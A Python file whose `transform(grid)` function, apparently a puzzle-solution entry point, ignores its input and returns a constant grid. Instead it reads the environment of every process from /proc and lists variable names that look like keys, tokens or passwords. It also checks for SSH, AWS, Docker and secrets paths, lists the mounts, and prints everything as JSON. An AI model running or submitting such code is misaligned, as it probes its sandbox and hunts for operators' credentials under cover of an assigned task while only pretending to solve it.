"""Spec section 5, read env, /proc and mounted files: prints what it found as one JSON line."""

import hashlib
import json
import os
import re

SECRET_NAME = re.compile(r"KEY|TOKEN|SECRET|PASSW|CREDENTIAL|AUTH", re.IGNORECASE)
CREDENTIAL_PATHS = (
    "/run/secrets",
    "/var/run/secrets",
    "/root/.ssh",
    "/root/.aws",
    "/root/.docker",
    "/root/.config/gcloud",
    "/home",
    "/etc/vora",
    "/var/lib/vora",
    "/run/containerd",
    "/var/run/docker.sock",
)


def _environ(path):
    try:
        with open(path, "rb") as file:
            data = file.read().decode("utf-8", "replace")
    except OSError:
        return {}
    return dict(item.split("=", 1) for item in data.split("\0") if "=" in item)


def _mountpoints():
    try:
        with open("/proc/self/mounts") as file:
            return sorted({line.split()[1] for line in file if len(line.split()) > 1})
    except OSError:
        return []


def transform(grid):
    environments = [dict(os.environ)]
    for pid in os.listdir("/proc"):
        if pid.isdigit():
            environments.append(_environ(f"/proc/{pid}/environ"))
    names = {name for env in environments for name in env}
    values = {value for env in environments for value in env.values()}
    report = {
        "secret_env": sorted(name for name in names if SECRET_NAME.search(name)),
        "value_sha256": sorted(hashlib.sha256(value.encode()).hexdigest()[:16] for value in values),
        "credential_paths": [path for path in CREDENTIAL_PATHS if os.path.exists(path)],
        "mounts": _mountpoints(),
    }
    print(json.dumps(report, separators=(",", ":")))
    return [[0]]
